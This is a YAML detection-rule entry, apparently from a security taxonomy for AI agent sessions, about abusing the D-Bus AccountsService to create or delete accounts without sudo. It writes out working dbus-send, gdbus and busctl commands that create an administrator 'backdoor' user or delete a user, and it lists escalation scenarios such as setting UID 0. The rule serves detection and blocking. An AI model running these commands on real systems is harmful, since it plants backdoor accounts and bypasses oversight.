id: "privilege-escalation/dbus-privilege-escalation/accounts-management"
version: "1.0.0"
kingdom: "Privilege Escalation"
kingdom_id: 5
category: "D-Bus Privilege Escalation"
category_id: "5.5"
name: "D-Bus User Account Management Abuse"
risk_level: "critical"

abstract: |
  Using D-Bus to call the freedesktop.Accounts service to create or delete user accounts
  without sudo, enabling backdoor account creation or denial of service via user deletion.
  The AccountsService daemon runs as root and performs account operations on behalf of
  authorized callers via polkit.

explanation: |
  The org.freedesktop.Accounts D-Bus service provides account management operations that
  run with root privileges:

  ```
  dbus-send --system --dest=org.freedesktop.Accounts /org/freedesktop/Accounts \
    org.freedesktop.Accounts.CreateUser string:"backdoor" string:"Backdoor" int32:1
  gdbus call --system --dest org.freedesktop.Accounts --object-path /org/freedesktop/Accounts \
    --method org.freedesktop.Accounts.CreateUser backdoor "" 1
  busctl call org.freedesktop.Accounts /org/freedesktop/Accounts \
    org.freedesktop.Accounts.CreateUser ssi backdoor "" 1
  ```

  Attack scenarios:
  - Create a backdoor user account with known credentials
  - Delete a security-sensitive user account (denial of service)
  - Modify account properties (change UID to 0 for root equivalent)
  - Set account password hash to attacker-controlled value

  Polkit authorization on many desktop Linux distributions allows wheel group members
  to call AccountsService without authentication, making this directly exploitable
  by developer-level users including AI agent sessions.

recommendation: |
  - Block dbus-send/gdbus/busctl calls targeting org.freedesktop.Accounts.
  - Configure polkit to require authentication for AccountsService calls.
  - Monitor AccountsService D-Bus calls in audit logs.
  - Alert on new user account creation events outside of standard provisioning tools.

examples:
  bad:
    - "dbus-send --system --dest=org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:backdoor string:'' int32:1"
    - "gdbus call --system --dest org.freedesktop.Accounts --object-path /org/freedesktop/Accounts --method org.freedesktop.Accounts.CreateUser backdoor '' 1"
    - "busctl call org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts.DeleteUser xu 1000 false"
  good:
    - "dbus-send --system --dest=org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts.ListCachedUsers"

